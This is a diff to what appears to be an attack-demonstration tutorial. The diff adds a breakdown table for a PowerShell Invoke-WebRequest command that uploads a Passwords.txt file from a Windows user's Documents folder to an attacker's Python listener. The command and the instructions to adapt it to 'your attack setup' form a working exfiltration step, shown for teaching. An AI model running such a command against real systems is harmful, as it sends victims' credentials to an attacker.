@@ -144,8 +144,20 @@ At this point they’re ready to begin the second stage of the attack. They’ve
 This is the full PowerShell command to upload the `Passwords.txt` file to the attacker's Python server:
  ```powershell
 powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
-# ⚠️ Make sure to update the IP address to match your attacker's listener
+# ⚠️ Make sure to change the IP address, port number, and file path to match your attack setup.
 ```
+
+### Command Breakdown
+See the table below for a breakdown of each part of the command.
+
+| Component            | Purpose                                                   |
+|----------------------|-----------------------------------------------------------|
+| `powershell -c`      | Runs the command within PowerShell                        |
+| `Invoke-WebRequest`  | Sends HTTP requests; here it’s used to upload a file      |
+| `-Uri`               | The destination URL (your Python listener endpoint)       |
+| `-Method Put`        | HTTP method used to upload the file                       |
+| `-InFile`            | Specifies the local file path to be uploaded              |
+
 
 
 *In Figure 11, you can see in the second terminal and is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*
